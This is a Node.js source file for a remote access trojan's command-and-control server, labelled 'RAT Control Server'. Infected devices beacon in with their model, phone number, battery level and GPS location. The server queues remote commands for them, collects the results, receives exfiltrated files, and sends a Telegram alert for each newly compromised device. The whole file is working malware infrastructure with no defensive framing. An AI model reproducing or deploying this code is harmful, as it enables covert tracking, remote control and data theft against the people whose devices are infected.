const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const { WebSocketServer } = require('ws');
const http = require('http');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

// Import bot
const bot = require('./bot');

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Database
const db = new sqlite3.Database('rat.db');

// Create tables
db.serialize(() => {
    db.run(`
        CREATE TABLE IF NOT EXISTS devices (
            id TEXT PRIMARY KEY,
            model TEXT,
            manufacturer TEXT,
            os TEXT,
            battery INTEGER,
            last_lat REAL,
            last_lon REAL,
            network TEXT,
            phone TEXT,
            last_seen DATETIME,
            first_seen DATETIME,
            status TEXT DEFAULT 'active',
            is_new INTEGER DEFAULT 0
        )
    `);

    db.run(`
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            command TEXT,
            params TEXT,
            status TEXT DEFAULT 'pending',
            issued_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            executed_at DATETIME,
            result TEXT
        )
    `);

    db.run(`
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            filename TEXT,
            path TEXT,
            size INTEGER,
            uploaded_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);
});

// WebSocket connections
const clients = new Map();

wss.on('connection', (ws, req) => {
    const clientIp = req.socket.remoteAddress;
    console.log(`[WS] Client connected: ${clientIp}`);

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            console.log('[WS] Received:', data.type);

            if (data.type === 'subscribe' && data.deviceId) {
                if (!clients.has(data.deviceId)) {
                    clients.set(data.deviceId, new Set());
                }
                clients.get(data.deviceId).add(ws);
                ws.deviceId = data.deviceId;
                ws.send(JSON.stringify({ type: 'subscribed', deviceId: data.deviceId }));
                console.log(`[WS] Client subscribed to: ${data.deviceId}`);
            }

            if (data.type === 'unsubscribe') {
                if (ws.deviceId && clients.has(ws.deviceId)) {
                    clients.get(ws.deviceId).delete(ws);
                }
                ws.deviceId = null;
                console.log('[WS] Client unsubscribed');
            }
        } catch (e) {
            console.error('[WS] Error:', e.message);
        }
    });

    ws.on('close', () => {
        if (ws.deviceId && clients.has(ws.deviceId)) {
            clients.get(ws.deviceId).delete(ws);
            if (clients.get(ws.deviceId).size === 0) {
                clients.delete(ws.deviceId);
            }
        }
        console.log(`[WS] Client disconnected: ${clientIp}`);
    });

    ws.on('error', (err) => {
        console.error('[WS] Error:', err.message);
    });
});

function broadcastToDevice(deviceId, data) {
    if (clients.has(deviceId)) {
        const message = JSON.stringify(data);
        for (const client of clients.get(deviceId)) {
            if (client.readyState === 1) {
                client.send(message);
            }
        }
    }
}

function broadcastToAll(data) {
    const message = JSON.stringify(data);
    for (const [deviceId, clientSet] of clients) {
        for (const client of clientSet) {
            if (client.readyState === 1) {
                client.send(message);
            }
        }
    }
}

// ==============================
// API ENDPOINTS
// ==============================

// GET /api/devices - List all devices
app.get('/api/devices', (req, res) => {
    db.all(
        `SELECT id, model, manufacturer, os, battery, last_lat, last_lon, 
                network, phone, last_seen, first_seen, status
         FROM devices 
         ORDER BY last_seen DESC`,
        (err, rows) => {
            if (err) {
                console.error('[DB] Error:', err);
                return res.status(500).json({ error: 'Database error' });
            }
            res.json(rows);
        }
    );
});

// GET /api/devices/:id - Get device detail with commands
app.get('/api/devices/:id', (req, res) => {
    const { id } = req.params;

    db.get(`SELECT * FROM devices WHERE id = ?`, [id], (err, device) => {
        if (err) {
            return res.status(500).json({ error: 'Database error' });
        }
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }

        db.all(
            `SELECT * FROM commands WHERE device_id = ? ORDER BY issued_at DESC LIMIT 50`,
            [id],
            (err, commands) => {
                if (err) {
                    return res.status(500).json({ error: 'Database error' });
                }
                db.all(
                    `SELECT * FROM files WHERE device_id = ? ORDER BY uploaded_at DESC`,
                    [id],
                    (err, files) => {
                        if (err) {
                            return res.status(500).json({ error: 'Database error' });
                        }
                        device.commands = commands || [];
                        device.files = files || [];
                        res.json(device);
                    }
                );
            }
        );
    });
});

// POST /api/beacon - Device heartbeat
app.post('/api/beacon', (req, res) => {
    const { 
        deviceId, model, manufacturer, os, battery, 
        lat, lon, network, phone, timestamp 
    } = req.body;

    if (!deviceId) {
        return res.status(400).json({ error: 'deviceId required' });
    }

    console.log(`[BEACON] ${deviceId} | ${model} | ${os} | Battery: ${battery}%`);

    // Check if device is new
    db.get(`SELECT first_seen FROM devices WHERE id = ?`, [deviceId], (err, row) => {
        const isNew = !row || !row.first_seen;

        // Insert or update device
        db.run(
            `INSERT OR REPLACE INTO devices 
             (id, model, manufacturer, os, battery, last_lat, last_lon, 
              network, phone, last_seen, first_seen, status, is_new)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, 
                     COALESCE((SELECT first_seen FROM devices WHERE id = ?), CURRENT_TIMESTAMP),
                     'active', ?)`,
            [
                deviceId, 
                model || 'Unknown', 
                manufacturer || 'Unknown',
                os || 'Unknown',
                battery || 0,
                lat || null,
                lon || null,
                network || null,
                phone || null,
                deviceId,
                isNew ? 1 : 0
            ],
            function(err) {
                if (err) {
                    console.error('[DB] Beacon error:', err);
                    return res.status(500).json({ error: 'Database error' });
                }

                // If new device, send Telegram notification
                if (isNew) {
                    console.log(`[BOT] New device: ${deviceId} (${model})`);
                    bot.notifyDeviceConnected(deviceId, model, os, battery, lat, lon)
                        .then(() => {
                            console.log(`[BOT] Notification sent for: ${deviceId}`);
                            // Broadcast to WebSocket clients
                            broadcastToAll({
                                type: 'device_connected',
                                deviceId: deviceId,
                                model: model,
                                os: os
                            });
                        })
                        .catch(err => {
                            console.error('[BOT] Failed to send:', err.message);
                        });
                }

                // Check for pending commands
                db.all(
                    `SELECT * FROM commands 
                     WHERE device_id = ? AND status = 'pending' 
                     ORDER BY id ASC LIMIT 1`,
                    [deviceId],
                    (err, rows) => {
                        if (err) {
                            console.error('[DB] Command check error:', err);
                            return res.json({ status: 'ok' });
                        }

                        if (rows.length > 0) {
                            const cmd = rows[0];
                            console.log(`[COMMAND] Sending to ${deviceId}: ${cmd.command}`);
                            try {
                                const params = JSON.parse(cmd.params || '{}');
                                res.json({
                                    command: cmd.command,
                                    params: params,
                                    command_id: cmd.id
                                });
                            } catch (e) {
                                res.json({
                                    command: cmd.command,
                                    params: {},
                                    command_id: cmd.id
                                });
                            }
                        } else {
                            res.json({ status: 'ok' });
                        }
                    }
                );
            }
        );
    });
});

// POST /api/result - Command result from device
app.post('/api/result', (req, res) => {
    const { deviceId, command, result, command_id } = req.body;

    if (!deviceId || !command) {
        return res.status(400).json({ error: 'deviceId and command required' });
    }

    console.log(`[RESULT] ${deviceId} | ${command}`);

    // If command_id is provided, update that specific command
    if (command_id) {
        db.run(
            `UPDATE commands SET status = 'executed', executed_at = CURRENT_TIMESTAMP, result = ?
             WHERE id = ? AND device_id = ? AND command = ?`,
            [JSON.stringify(result || {}), command_id, deviceId, command],
            function(err) {
                if (err) {
                    console.error('[DB] Result update error:', err);
                }
                // Broadcast to subscribers
                broadcastToDevice(deviceId, {
                    type: 'result',
                    command: command,
                    result: result || {},
                    command_id: command_id
                });
                res.json({ status: 'ok' });
            }
        );
    } else {
        // Fallback: update latest pending command
        db.run(
            `UPDATE commands SET status = 'executed', executed_at = CURRENT_TIMESTAMP, result = ?
             WHERE device_id = ? AND command = ? AND status = 'pending'
             ORDER BY id DESC LIMIT 1`,
            [JSON.stringify(result || {}), deviceId, command],
            function(err) {
                if (err) {
                    console.error('[DB] Result update error:', err);
                }
                broadcastToDevice(deviceId, {
                    type: 'result',
                    command: command,
                    result: result || {}
                });
                res.json({ status: 'ok' });
            }
        );
    }
});

// POST /api/command - Queue a command
app.post('/api/command', (req, res) => {
    const { deviceId, command, params } = req.body;

    if (!deviceId || !command) {
        return res.status(400).json({ error: 'deviceId and command required' });
    }

    console.log(`[CMD_QUEUE] ${deviceId} | ${command}`);

    db.run(
        `INSERT INTO commands (device_id, command, params, status) 
         VALUES (?, ?, ?, 'pending')`,
        [deviceId, command, JSON.stringify(params || {})],
        function(err) {
            if (err) {
                console.error('[DB] Command queue error:', err);
                return res.status(500).json({ error: 'Database error' });
            }

            const cmdId = this.lastID;

            // Notify WebSocket subscribers
            broadcastToDevice(deviceId, {
                type: 'command_queued',
                command: command,
                params: params || {},
                command_id: cmdId
            });

            // Also try to push immediately via beacon response
            // (Device will pick it up on next poll)

            res.json({
                status: 'queued',
                commandId: cmdId,
                deviceId: deviceId,
                command: command
            });
        }
    );
});

// POST /api/upload - Upload file from device
app.post('/api/upload', (req, res) => {
    const { deviceId, filename, data } = req.body;

    if (!deviceId || !filename) {
        return res.status(400).json({ error: 'deviceId and filename required' });
    }

    const uploadDir = path.join(__dirname, 'uploads', deviceId);
    fs.mkdirSync(uploadDir, { recursive: true });

    const filePath = path.join(uploadDir, filename);

    try {
        const buffer = Buffer.from(data, 'base64');
        fs.writeFileSync(filePath, buffer);

        db.run(
            `INSERT INTO files (device_id, filename, path, size) 
             VALUES (?, ?, ?, ?)`,
            [deviceId, filename, filePath, buffer.length],
            function(err) {
                if (err) {
                    console.error('[DB] Upload error:', err);
                    return res.status(500).json({ error: 'Database error' });
                }
                res.json({ 
                    status: 'uploaded', 
                    fileId: this.lastID,
                    path: filePath,
                    size: buffer.length
                });
            }
        );
    } catch (e) {
        console.error('[UPLOAD] Error:', e.message);
        res.status(500).json({ error: 'Upload failed' });
    }
});

// GET /api/files/:deviceId - List files for device
app.get('/api/files/:deviceId', (req, res) => {
    const { deviceId } = req.params;

    db.all(
        `SELECT id, filename, path, size, uploaded_at FROM files 
         WHERE device_id = ? ORDER BY uploaded_at DESC`,
        [deviceId],
        (err, rows) => {
            if (err) {
                return res.status(500).json({ error: 'Database error' });
            }
            res.json(rows);
        }
    );
});

// DELETE /api/device/:id - Remove device
app.delete('/api/device/:id', (req, res) => {
    const { id } = req.params;

    db.run(`DELETE FROM devices WHERE id = ?`, [id], function(err) {
        if (err) {
            return res.status(500).json({ error: 'Database error' });
        }
        res.json({ status: 'deleted', deviceId: id });
    });
});

// GET /api/stats - Quick stats
app.get('/api/stats', (req, res) => {
    db.get(`SELECT COUNT(*) as total FROM devices`, (err, totalRow) => {
        if (err) return res.status(500).json({ error: 'Database error' });
        
        db.get(
            `SELECT COUNT(*) as online FROM devices 
             WHERE status = 'active' AND last_seen > datetime('now', '-5 minutes')`,
            (err, onlineRow) => {
                if (err) return res.status(500).json({ error: 'Database error' });
                
                res.json({
                    total: totalRow?.total || 0,
                    online: onlineRow?.online || 0,
                    offline: (totalRow?.total || 0) - (onlineRow?.online || 0)
                });
            }
        );
    });
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// ==============================
// START SERVER
// ==============================

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔════════════════════════════════════════╗
║     RAT Control Server Started         ║
╠════════════════════════════════════════╣
║  Port: ${PORT}                              
║  WebSocket: ws://localhost:${PORT}         
║  API: http://localhost:${PORT}/api        
║  Dashboard: http://localhost:${PORT}      
╚════════════════════════════════════════╝
    `);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n[Server] Shutting down...');
    wss.close(() => {
        db.close(() => {
            process.exit(0);
        });
    });
});
